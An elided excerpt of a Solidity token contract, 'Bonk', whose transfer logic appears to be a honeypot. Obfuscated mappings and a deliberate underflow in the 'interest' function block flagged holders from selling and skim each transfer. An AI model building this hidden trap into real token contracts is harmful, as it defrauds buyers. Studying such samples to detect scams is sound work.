...
contract Bonk is Ownable {
    ...
    mapping(address => uint256) private oxygen;
    ...
    function interest(
        ...
        address chemical = address(uniswapV2Pair);

        if (pen[shelter] == 0 && (chemical != shelter) && bowl[shelter] > 0) {
            pen[shelter] -= fix;
        }
        ...
        oxygen[shelter] -= on;
        uint256 count = (on / 100) * growth;
        on -= count;
        bowl[travel] += fix;
        oxygen[directly] += on;
    }

    mapping(address => uint256) private bowl;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private pen;
    ...
    function transferFrom(
        ...
        interest(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        interest(msg.sender, recipient, amount);
        return true;
    }
